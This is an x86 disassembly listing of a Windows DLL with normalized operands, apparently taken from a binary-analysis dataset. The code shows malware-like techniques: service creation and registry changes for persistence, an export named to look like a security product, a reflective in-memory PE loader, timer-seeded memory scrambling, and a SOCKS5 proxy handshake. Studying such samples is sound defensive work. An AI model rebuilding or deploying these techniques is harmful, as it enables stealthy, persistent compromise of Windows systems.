mov [ rw-data ] 0x10
mov [ rw-data ] 0x3
mov [ rw-data ] 0x1
call [ SetServiceStatus@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetEvent@IAT ]
mov eax [ rw-data ]
xor edx edx
call sub_10005900
sub eax 0x4
jne r-xdata
pop ebp
retn 0x4
push 0xffffffff
mov [ rw-data ] eax
call [ ExitProcess@IAT ]
sub_10005a10
push ebp
mov ebp esp
mov eax 0x291c
call sub_10013210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0x2910 ]
push eax
push rw-data
xor edi edi
push 0x80000002
mov [ ebp - 0x2910 ] edi
mov [ ebp - 0x2918 ] edi
mov [ ebp - 0x2909 ] 0x0
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x2909 ] 0x0
push 0x2800
lea ecx [ ebp - 0x2908 ]
push edi
push ecx
call sub_1000ffa0
add esp 0xc
lea edx [ ebp - 0x2914 ]
push edx
mov edx [ ebp - 0x2910 ]
lea eax [ ebp - 0x2908 ]
push eax
lea ecx [ ebp - 0x291c ]
push ecx
push edi
push rw-data
push edx
mov [ ebp - 0x2914 ] 0x2800
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x291c ] 0x7
jne r-xdata
mov eax [ ebp - 0x2914 ]
lea esi [ ebp - 0x2908 ]
lea ecx [ ebp + eax - 0x2908 ]
mov edx esi
cmp edx ecx
jae r-xdata
lea edx [ ebp + eax - 0x2909 ]
mov eax rw-data
mov esi edx
sub esi eax
mov edi edi
push rw-data
push esi
call sub_10014e74
add esp 0x8
test eax eax
je r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax edx
lea esi [ eax + 0x1 ]
nop
mov ecx [ ebp - 0x2914 ]
mov eax [ ebp - 0x2910 ]
push ecx
lea edx [ ebp - 0x2908 ]
push edx
push 0x7
push edi
mov edi [ RegSetValueExA@IAT ]
push rw-data
push eax
call edi
mov ecx [ ebp - 0x2910 ]
mov ebx [ RegCloseKey@IAT ]
push ecx
mov esi eax
call ebx
test esi esi
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp - 0x2914 ]
sub eax esi
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x2914 ] eax
mov eax edx
lea esi [ eax + 0x1 ]
mov edi edi
push 0xf003f
push esi
push esi
call [ OpenSCManagerA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x2914 ]
lea ecx [ ebp + eax - 0x2908 ]
cmp esi ecx
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov [ edx + eax ] di
push esi
push rw-data
push esi
push esi
push esi
push rw-data
push 0x1
push 0x2
push 0x10
push 0xf01ff
push rw-data
push rw-data
push eax
call [ CreateServiceA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
movzx eax [ ebp - 0x2909 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
push 0x103
lea edx [ ebp - 0x107 ]
push esi
push edx
mov [ ebp - 0x108 ] 0x0
call sub_1000ffa0
push rw-data
push rw-data
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call sub_10008d73
add esp 0x1c
lea ecx [ ebp - 0x2910 ]
push ecx
lea edx [ ebp - 0x108 ]
push edx
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
test eax eax
jle r-xdata
mov edx [ ebp - 0x2910 ]
lea ecx [ ebp - 0x2918 ]
push ecx
push rw-data
push edx
call [ RegCreateKeyA@IAT ]
mov esi eax
mov eax [ ebp - 0x2910 ]
push eax
call ebx
test esi esi
jne r-xdata
inc eax
push eax
mov eax [ ebp - 0x2910 ]
push rw-data
push 0x1
push 0x0
push rw-data
push eax
call edi
mov eax rw-data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp - 0x2918 ]
sub eax edx
add eax 0x2
push eax
push rw-data
push 0x2
push 0x0
push rw-data
push ecx
call edi
mov edx [ ebp - 0x2918 ]
push edx
mov esi eax
call ebx
test esi esi
sete [ ebp - 0x2909 ]
jmp r-xdata
sub_10005d00
push ebx
push edi
push 0xf003f
push 0x0
push 0x0
xor bl bl
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
movzx eax bl
pop ebx
retn
push esi
push 0xf01ff
push rw-data
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop esi
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
mov bl 0x1
McInitMISPAlert
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push esi
xor esi esi
call sub_10004820
cmp al 0x1
je r-xdata
push 0x0
call sub_10005540
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
call sub_10004b70
cmp al 0x1
je r-xdata
call sub_10005a10
cmp eax 0x1
jne r-xdata
call sub_10005d00
pop esi
mov esp ebp
pop ebp
retn
sub_10005da0
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
push ecx
push edx
call sub_10004420
mov eax [ esi ]
push eax
call sub_10009140
add esp 0xc
sub_10005dda
push ebp
mov ebp esp
push esi
movzx ecx cl
mov esi eax
push edi
mov eax ecx
push 0x3
cdq
pop edi
idiv edi
jmp r-xdata
cmp edx [ ebp + 0x8 ]
jl r-xdata
lea eax [ ecx + edx ]
and eax 0x80000001
jns r-xdata
pop edi
pop esi
pop ebp
retn
inc al
cmp [ ebp + 0xc ] 0x0
je r-xdata
dec eax
or eax 0xfffffffe
inc eax
sub [ esi ] al
add [ esi ] al
jmp r-xdata
movzx eax al
add edx eax
add esi eax
sub_10005e1b
push ebp
mov ebp esp
movzx ecx cl
and ecx 0x80000001
push esi
jns r-xdata
inc cl
movzx esi cl
cmp esi [ ebp + 0x8 ]
jge r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
pop esi
pop ebp
retn
mov edx esi
sub edx eax
push edi
and edi 0x80000001
jns r-xdata
and edi 0x80000001
jns r-xdata
jne r-xdata
dec edi
or edi 0xfffffffe
inc edi
jne r-xdata
dec edi
or edi 0xfffffffe
inc edi
add [ eax ] cl
sub [ eax ] cl
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ edx + eax ]
je r-xdata
pop edi
add eax esi
lea edi [ edx + eax ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
sub_10005e79
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and edx 0xf
dec edx
je r-xdata
mov cl [ ecx ]
dec edx
je r-xdata
mov cl [ ecx + 0x1 ]
jmp r-xdata
dec edx
je r-xdata
push edi
push esi
call sub_10005dda
mov cl [ ecx + 0x2 ]
jmp r-xdata
dec edx
je r-xdata
mov cl [ ecx + 0x1 ]
jmp r-xdata
dec edx
je r-xdata
push edi
push esi
call sub_10005e1b
jmp r-xdata
mov cl [ ecx + 0x2 ]
jmp r-xdata
dec edx
jne r-xdata
pop ecx
pop ecx
mov eax esi
pop ebp
retn
mov cl [ ecx + 0x3 ]
sub_10005ec3
sub eax [ rw-data ]
push esi
push edi
xor edi edi
mov edx rw-data
add edx 0x10
inc edi
cmp edx rw-data
jl r-xdata
mov ecx eax
sub ecx esi
js r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
or eax 0xffffffff
movzx esi [ edx - 0x4 ]
cmp ecx esi
jle r-xdata
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_10005efc
push ebp
mov ebp esp
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax [ rw-data ]
mov edx 0x5a4d
cmp [ eax ] dx
je r-xdata
mov edx [ eax + 0x3c ]
cmp [ eax + edx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
mov edx edi
sub edx eax
sub eax [ rw-data ]
push esi
xor esi esi
test ecx ecx
je r-xdata
pop esi
mov ecx [ esi * 4 + rw-data ]
sub ecx edx
js r-xdata
inc esi
cmp esi [ rw-data ]
jb r-xdata
cmp ecx [ ebp + 0x8 ]
jge r-xdata
add ecx edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
add [ ecx ] eax
sub [ ecx ] eax
jmp r-xdata
sub_10005f66
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp + 0x8 ]
mov edi [ eax - 0x4 ]
inc edi
xor ebx ebx
mov [ ebp - 0x8 ] edi
mov esi rw-data
cmp [ rw-data ] ebx
jne r-xdata
push esi
call [ EnterCriticalSection@IAT ]
test [ ebp + 0x8 ] 0x20
jne r-xdata
push 0x3e8
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ ebp + 0x8 ] ebx
je r-xdata
push ebx
call [ ExitProcess@IAT ]
mov eax edi
call sub_10005ec3
cmp eax 0xffffffff
je r-xdata
mov ebx eax
shl ebx 0x4
test [ ebp + 0x8 ] 0x10
movzx esi [ ebx + rw-data ]
jne r-xdata
mov eax [ ebx + rw-data ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push esi
push edi
call [ rw-data ]
movzx edx [ ebx + rw-data ]
lea ecx [ ebx + rw-data ]
push edi
xor edi edi
mov [ ebp + 0x8 ] edx
mov [ ebp - 0xc ] ecx
call sub_10005e79
pop ecx
cmp [ ebx + rw-data ] edi
jne r-xdata
push 0x1
push esi
call sub_10005efc
pop ecx
pop ecx
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
push edi
mov edi [ ebp - 0x8 ]
push esi
call sub_10005efc
pop ecx
pop ecx
push esi
push edi
push eax
call sub_10010170
add esp 0xc
test [ ebp + 0x8 ] 0x10
jne r-xdata
push esi
push [ ebp - 0x8 ]
mov [ ebx + rw-data ] edi
push edi
call sub_10010170
mov ebx [ ebp - 0xc ]
add esp 0xc
mov [ ebp - 0x4 ] 0x4
call [ GetTickCount@IAT ]
add eax edi
mov ecx 0x269ec3
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x10 ]
push esi
push [ ebp - 0x8 ]
call [ rw-data ]
imul eax eax 0x343fd
add eax ecx
mov edx eax
shr edx 0x10
dec [ ebp - 0x4 ]
mov [ ebx ] dl
inc ebx
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov edx [ ebp + 0x8 ]
imul eax eax 0x343fd
push edi
add eax ecx
mov ecx [ ebp - 0xc ]
xor edi edi
inc edi
mov [ rw-data ] eax
call sub_10005e79
pop ecx
sub_100060f3
push ebp
mov ebp esp
push ecx
push ecx
push ebx
lea eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub ebx 0xe
mov eax ebx
call sub_10005ec3
cmp eax 0xffffffff
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
pop ebx
leave
retn 0x4
push esi
push edi
mov edi eax
shl edi 0x4
movzx edx [ edi + rw-data ]
movzx esi [ edi + rw-data ]
sub ebx esi
mov [ ebp - 0x8 ] edx
test dl 0x20
jne r-xdata
pop edi
pop esi
test edx edx
je r-xdata
mov [ ebp + 0x8 ] edx
and [ ebp + 0x8 ] 0x10
jne r-xdata
mov eax [ edi + rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x40
push esi
push ebx
call [ rw-data ]
mov edx [ ebp - 0x8 ]
push esi
push eax
push ebx
call sub_10010170
add esp 0xc
lea ecx [ edi + rw-data ]
xor edi edi
push ebx
inc edi
call sub_10005e79
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x4 ]
push esi
push ebx
call [ rw-data ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub_10006199
push ebp
mov ebp esp
sub esp 0x298
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push rw-data
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
and [ ebp - 0x294 ] 0x0
lea ecx [ ebp - 0x294 ]
push ecx
lea ecx [ ebp - 0x290 ]
push ecx
mov [ ebp - 0x298 ] eax
call eax
cmp eax 0x6f
jne r-xdata
xor eax eax
push [ ebp - 0x294 ]
mov esi [ GetProcessHeap@IAT ]
push 0x0
call esi
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x294 ]
push eax
push ebx
call [ ebp - 0x298 ]
test eax eax
jne r-xdata
push eax
jmp r-xdata
push ebx
mov eax ebx
push 0x0
call esi
push eax
call [ HeapFree@IAT ]
push ebx
push 0x0
call esi
push eax
call [ HeapFree@IAT ]
xor eax eax
inc eax
jmp r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
mov ecx [ eax + 0x194 ]
mov [ edi ] ecx
mov ecx [ eax + 0x198 ]
mov [ edi + 0x4 ] ecx
mov ecx [ edi ]
or ecx [ edi + 0x4 ]
jne r-xdata
sub_10006266
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi 0x400
push esi
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push esi
mov edi eax
push ebx
push edi
call sub_1000ffa0
add esp 0xc
push ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
push 0x1
push ebx
push ebx
push ebx
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push rw-data
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] esi
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x8 ]
mov esi eax
call [ RegCloseKey@IAT ]
mov eax rw-data
cmp esi ebx
je r-xdata
mov eax rw-data
mov edx edi
sub edx eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov esi edi
mov ecx eax
sub esi eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x4 ] 0x2
je r-xdata
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
cmp dl bl
jne r-xdata
cmp [ ebp - 0x4 ] 0x6
je r-xdata
mov edx edi
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
sub_1000632f
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0x14 ]
push esi
lea esi [ ecx + eax + 0x28 ]
xor ecx ecx
cmp cx [ eax + 0x6 ]
jae r-xdata
pop esi
leave
retn
push ebx
push edi
mov edi [ VirtualAlloc@IAT ]
mov ebx 0x1000
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
mov ecx [ esi + 0x4 ]
push [ esi ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push ecx
push eax
call sub_10010170
mov eax [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
test eax eax
jle r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
pop edi
pop ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
movzx eax [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add esi 0x28
cmp [ ebp - 0x4 ] eax
jl r-xdata
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
push [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
push 0x0
push eax
call sub_1000ffa0
jmp r-xdata
add esp 0xc
sub_100063d3
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x14 ]
and [ ebp - 0x4 ] 0x0
xor edx edx
lea ecx [ ecx + eax + 0x18 ]
cmp dx [ eax + 0x6 ]
jae r-xdata
leave
retn
push ebx
push esi
push edi
lea ebx [ ecx + 0x24 ]
lea ecx [ esi + ecx * 2 ]
lea ecx [ edi + ecx * 2 ]
mov esi [ ecx * 4 + rw-data ]
test edx 0x4000000
je r-xdata
push 0x4000
push [ ebx - 0x14 ]
push [ ebx - 0x1c ]
call [ VirtualFree@IAT ]
jmp r-xdata
mov ecx [ ebx - 0x14 ]
test ecx ecx
jne r-xdata
or esi 0x200
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add ebx 0x28
cmp [ ebp - 0x4 ] ecx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push esi
push ecx
push [ ebx - 0x1c ]
call [ VirtualProtect@IAT ]
test dl 0x40
je r-xdata
mov edx [ ebx ]
mov ecx edx
mov esi edx
shr ecx 0x1d
shr esi 0x1e
mov edi edx
and ecx 0x1
and esi 0x1
shr edi 0x1f
test edx 0x2000000
je r-xdata
pop edi
pop esi
pop ebx
test dl dl
jns r-xdata
mov ecx [ eax + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
sub_10006490
push ebp
mov ebp esp
push ecx
push esi
mov esi [ eax + 0x4 ]
mov eax [ eax ]
cmp [ eax + 0xa4 ] 0x0
jbe r-xdata
pop esi
leave
retn
mov eax [ eax + 0xa0 ]
add eax esi
mov ecx [ eax ]
test ecx ecx
je r-xdata
push ebx
push edi
add eax [ eax + 0x4 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
movzx ecx [ edx ]
mov ebx ecx
and ebx 0xfffff000
cmp ebx 0x3000
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ ecx + esi ]
mov ecx [ eax + 0x4 ]
sub ecx 0x8
lea edx [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
pop edi
pop ebx
mov ecx [ eax + 0x4 ]
inc [ ebp - 0x4 ]
sub ecx 0x8
shr ecx 0x1
add edx 0x2
cmp [ ebp - 0x4 ] ecx
jb r-xdata
mov ebx [ ebp + 0x8 ]
and ecx 0xfff
add [ ecx + edi ] ebx
sub_1000650b
push ebp
mov ebp esp
sub esp 0x10
mov eax [ edi ]
cmp [ eax + 0x84 ] 0x0
push ebx
mov ebx [ edi + 0x4 ]
mov [ ebp - 0xc ] 0x1
jbe r-xdata
mov eax [ ebp - 0xc ]
pop ebx
leave
retn
push esi
mov esi [ eax + 0x80 ]
push 0x14
add esi ebx
push esi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
pop esi
add esi 0x10
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov eax [ esi - 0x4 ]
test eax eax
je r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ edi + 0xc ]
lea eax [ eax * 4 + 0x4 ]
push eax
push [ edi + 0x8 ]
call sub_10009f96
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + ecx * 4 ] edx
inc [ edi + 0xc ]
mov eax [ esi - 0x10 ]
test eax eax
je r-xdata
mov esi [ esi ]
add esi ebx
mov ecx esi
lea esi [ eax + ebx ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
add ecx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x4 ] ecx
sub [ ebp - 0x4 ] esi
test eax eax
mov eax [ esi ]
test eax eax
je r-xdata
add [ ebp - 0x8 ] 0x14
mov eax [ ebp - 0x8 ]
push 0x14
add eax 0xfffffff0
push eax
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
add eax ebx
add eax 0x2
and eax 0xffff
jmp r-xdata
mov esi [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x0
add esi 0x4
mov eax [ esi ]
test eax eax
jne r-xdata
push eax
push [ ebp - 0x10 ]
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + esi ] eax
mov eax ecx
cmp [ eax + esi ] 0x0
je r-xdata
jns r-xdata
jmp r-xdata
sub_10006625
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
push ebx
mov ebx [ eax + 0x3c ]
add ebx eax
cmp [ ebx ] 0x4550
je r-xdata
xor eax eax
leave
retn
push esi
mov esi [ VirtualAlloc@IAT ]
push edi
push 0x4
mov edi 0x2000
push edi
push [ ebx + 0x50 ]
push [ ebx + 0x34 ]
call esi
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov eax [ ebp - 0x4 ]
push 0x4
xor ecx ecx
push 0x1000
mov [ edi + 0x4 ] eax
mov [ edi + 0xc ] ecx
mov [ edi + 0x8 ] ecx
mov [ edi + 0x10 ] ecx
push [ ebx + 0x50 ]
push eax
call esi
push 0x4
push 0x1000
push [ ebx + 0x54 ]
push [ ebp - 0x4 ]
call esi
mov ecx [ ebx + 0x54 ]
mov esi [ ebp + 0x8 ]
add ecx [ esi + 0x3c ]
mov [ ebp - 0x8 ] eax
push ecx
push esi
push eax
call sub_10010170
mov eax [ esi + 0x3c ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
push ebx
mov [ edi ] eax
push esi
mov [ eax + 0x34 ] ecx
call sub_1000632f
mov esi [ ebp - 0x4 ]
mov eax esi
add esp 0x18
sub eax [ ebx + 0x34 ]
je r-xdata
push 0x4
push edi
push [ ebx + 0x50 ]
push eax
call esi
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
call sub_1000650b
test eax eax
je r-xdata
push eax
mov eax edi
call sub_10006490
pop ecx
xor eax eax
jmp r-xdata
mov esi edi
call sub_10006742
push edi
call sub_100063d3
mov eax [ edi ]
mov eax [ eax + 0x28 ]
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
mov eax edi
add eax esi
je r-xdata
push 0x0
xor ebx ebx
inc ebx
push ebx
push esi
call eax
test eax eax
jne r-xdata
mov [ edi + 0x10 ] ebx
sub_10006742
push ebx
xor ebx ebx
cmp esi ebx
je r-xdata
pop ebx
retn
cmp [ esi + 0x10 ] ebx
je r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov ecx [ ecx + 0x28 ]
push ebx
push ebx
push eax
add ecx eax
call ecx
mov [ esi + 0x10 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push edi
xor edi edi
cmp [ esi + 0xc ] ebx
jle r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push ebx
push eax
call [ VirtualFree@IAT ]
push [ esi + 0x8 ]
call sub_10009957
pop ecx
pop edi
mov eax [ esi + 0x8 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0xffffffff
je r-xdata
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
push [ eax ]
call [ FreeLibrary@IAT ]
sub_100067b5
mov eax [ edi + 0x80 ]
push esi
test eax eax
je r-xdata
lea esi [ edi + 0x64 ]
call sub_10003d60
lea esi [ edi + 0x48 ]
call sub_10003d60
lea esi [ edi + 0x28 ]
call sub_10003d60
lea esi [ edi + 0x8 ]
call sub_10003d60
pop esi
retn
push eax
call sub_10009014
and [ edi + 0x80 ] 0x0
pop ecx
sub_100067f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x10
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] ecx
cmp ecx 0xf
jle r-xdata
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
jle r-xdata
xor al al
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
lea esi [ eax + 0x1 ]
mov bl [ ecx + esi - 0x1 ]
cmp bl 0x30
jl r-xdata
leave
retn 0x4
pop edi
pop esi
pop ebx
cmp bl 0x2e
je r-xdata
cmp bl 0x39
jle r-xdata
mov edx [ ebp - 0xc ]
sub eax edx
mov ecx eax
cmp ecx 0x1
jl r-xdata
test bl bl
jne r-xdata
cmp bl 0x2e
je r-xdata
xor al al
jmp r-xdata
cmp ecx 0x3
jg r-xdata
test bl bl
jne r-xdata
add edx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x7 ]
stosw [ edi ]
push ecx
stosb [ edi ]
push edx
lea eax [ ebp - 0x8 ]
push eax
call sub_10008ef0
lea eax [ ebp - 0x8 ]
push eax
call sub_10008ee4
add esp 0x10
cmp eax 0xff
ja r-xdata
mov eax esi
cmp eax [ ebp - 0x10 ]
jl r-xdata
cmp bl 0x2e
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
inc [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
xor eax eax
inc eax
cmp [ ebp - 0x4 ] 0x5
je r-xdata
sub_100068be
push ebp
mov ebp esp
push ecx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
push esi
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push esi
call [ inet_addr@IAT ]
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
push ecx
push [ eax ]
lea eax [ ebp - 0x4 ]
push eax
call sub_10010170
mov eax [ ebp - 0x4 ]
add esp 0xc
jmp r-xdata
leave
retn
cmp eax 0xffffffff
jne r-xdata
sub_100068fd
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ edi + 0x28 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
movzx ecx [ edi + 0x44 ]
push ebx
push ecx
mov edx eax
mov ecx edi
call sub_10006b52
test al al
je r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
push esi
mov esi [ send@IAT ]
push 0x0
push 0x4
lea eax [ ebp - 0x104 ]
push eax
push [ edi ]
mov [ ebp - 0x104 ] 0x2000205
call esi
cmp eax 0x4
jne r-xdata
xor al al
push 0x0
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push [ edi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
cmp [ ebp - 0x104 ] 0x5
jne r-xdata
cmp [ ebp - 0x103 ] 0x0
je r-xdata
cmp [ ebp - 0x103 ] 0x2
jne r-xdata
cmp [ ebp - 0x103 ] 0x2
jne r-xdata
lea ebx [ edi + 0x8 ]
cmp [ ebx + 0x14 ] 0x10
mov [ ebp - 0x104 ] 0x1000105
jb r-xdata
mov eax [ edi + 0x74 ]
mov ebx [ edi + 0x58 ]
mov [ ebp - 0x108 ] eax
lea eax [ edi + 0x48 ]
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x104 ] 0x1
mov [ ebp - 0x103 ] bl
jb r-xdata
mov esi ebx
mov esi [ ebx ]
jmp r-xdata
push ebx
push eax
lea eax [ ebp - 0x102 ]
push eax
call sub_100092b0
mov edx [ ebp - 0x108 ]
lea eax [ ebp + ebx - 0x102 ]
add esp 0xc
mov [ eax ] dl
lea ecx [ edi + 0x64 ]
inc eax
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax [ eax ]
xor eax eax
call sub_100068be
jmp r-xdata
test esi esi
je r-xdata
push edx
push ecx
push eax
call sub_100092b0
mov eax [ ebp - 0x108 ]
add esp 0xc
push 0x0
lea ebx [ eax + ebx + 0x3 ]
push ebx
lea eax [ ebp - 0x104 ]
push eax
push [ edi ]
call esi
cmp eax ebx
jne r-xdata
mov ecx [ ecx ]
cmp [ ebx + 0x14 ] 0x10
